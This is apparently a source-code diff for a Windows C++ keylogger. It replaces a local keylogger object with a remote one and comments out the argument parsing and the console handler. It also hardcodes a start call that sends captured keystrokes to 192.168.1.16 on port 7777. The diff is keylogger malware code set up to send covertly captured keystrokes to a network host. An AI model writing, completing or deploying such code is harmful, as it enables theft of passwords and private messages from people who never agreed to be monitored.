@@ -8,7 +8,7 @@ string* g_file_path = new string(DEFAULT_FILE_PATH);
 string* g_ip = new string(DEFAULT_IP_VALUE);
 int g_port = DEFAULT_PORT_VALUE;
 
-keylogger* g_keylogger = new keylogger_local();
+keylogger_remote* g_keylogger = new keylogger_remote();
 
 BOOL exit_program()
 {
@@ -17,6 +17,7 @@ BOOL exit_program()
 	exit (EXIT_FAILURE);
 }
 
+/*
 void initialize_options(int argc, char** argv)
 {
 	int t_result_option = 0;
@@ -29,8 +30,6 @@ void initialize_options(int argc, char** argv)
 	LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH },
 	{
 	LONG_OPTION_REMOTE, no_argument, NULL, SHORT_OPTION_REMOTE },
-	{
-	LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH },
 	{
 	LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH },
 	{
@@ -97,9 +96,12 @@ void print_help()
 
 	exit(1);
 }
+*/
 
-int main(int p_number_arguments, char** p_arguments_values)
+//int p_number_arguments, char** p_arguments_values
+int main()
 {
+	/*
 	if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE) exit_program, TRUE))
 	{
 		cerr << ERROR_MESSAGE_SETCONTROLECTRLHANDLER << endl;
@@ -108,15 +110,13 @@ int main(int p_number_arguments, char** p_arguments_values)
 
 	initialize_options(p_number_arguments, p_arguments_values);
 
-	/*
-	 if(g_keylogger_local == true)
-	 reinterpret_cast<keylogger_local*>(g_keylogger)->initialize(*g_file_path);
-	 else
-	 reinterpret_cast<keylogger_remote*>(g_keylogger)->initialize(*g_ip, g_port);
-	 */
-
 	delete g_file_path;
 	delete g_ip;
+	*/
+
+	g_keylogger = new keylogger_remote();
+
+	g_keylogger->initialize("192.168.1.16", 7777);
 
 	g_keylogger->start();
 
